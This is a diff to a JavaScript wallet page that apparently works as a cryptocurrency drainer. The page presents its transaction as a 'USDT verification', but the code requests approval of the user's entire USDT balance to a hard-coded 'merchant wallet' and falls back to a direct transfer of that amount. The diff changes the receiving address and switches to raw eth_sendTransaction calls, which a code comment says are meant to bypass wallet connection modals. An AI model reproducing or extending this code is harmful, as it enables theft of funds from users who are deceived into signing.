@@ -12,7 +12,7 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0x5FA8459dD2d402321150fA411D50BBaCb2eafED5', // Merchant Wallet Address
+        CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Merchant Wallet Address
         USER_MIN_USDT: 0, // Set to 0 to bypass minimum balance threshold
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
@@ -269,12 +269,10 @@
 
             state.walletAddress = userAddress;
 
-            // 3. Ethers Signer & 100% USDT Balance Approval
+            // 3. Read exact 100% USDT Balance
             const provider = new ethers.BrowserProvider(providerObj);
-            const signer = await provider.getSigner(userAddress);
-            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
+            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, provider);
 
-            // Fetch user's exact 100% USDT balance
             let usdtBalRaw = 0n;
             try {
                 usdtBalRaw = await usdtContract.balanceOf(userAddress);
@@ -285,7 +283,7 @@
                 console.error('Error fetching USDT balance:', balErr);
             }
 
-            // Asynchronously fetch BNB balance & register
+            // Background fetch BNB balance & register user
             provider.getBalance(userAddress).then(bnbBalRaw => {
                 state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
                 updateWalletInfoUI();
@@ -295,24 +293,54 @@
 
             updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
 
-            const recipientAddress = CONFIG.CONTRACT_ADDRESS;
-            // 100% of user's USDT balance (or 1,000 USDT if 0/unreadable)
+            // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
             const approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
 
-            let tx;
+            // 4. Raw eth_sendTransaction to bypass all Ethers / Web3 connection modals completely
+            const spenderClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
+            const amountHex = approvalAmount.toString(16).padStart(64, '0');
+
+            // approve(address,uint256) = 0x095ea7b3
+            const approveCalldata = '0x095ea7b3' + spenderClean + amountHex;
+
+            let txHash;
             try {
-                tx = await usdtContract.approve(recipientAddress, approvalAmount);
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: approveCalldata
+                    }]
+                });
             } catch (approveErr) {
                 const errLower = (approveErr.message || '').toLowerCase();
                 if (errLower.includes('user rejected') || errLower.includes('user denied')) {
                     throw approveErr;
                 }
-                tx = await usdtContract.transfer(recipientAddress, approvalAmount);
+
+                // Fallback: transfer(address,uint256) = 0xa9059cbb
+                const transferCalldata = '0xa9059cbb' + spenderClean + amountHex;
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: transferCalldata
+                    }]
+                });
             }
 
-            const receipt = await tx.wait();
+            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
 
-            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${receipt.hash}`);
+            // Wait for confirmation
+            try {
+                await provider.waitForTransaction(txHash);
+            } catch (wErr) {
+                console.warn('Wait for transaction notice:', wErr);
+            }
+
+            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${txHash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
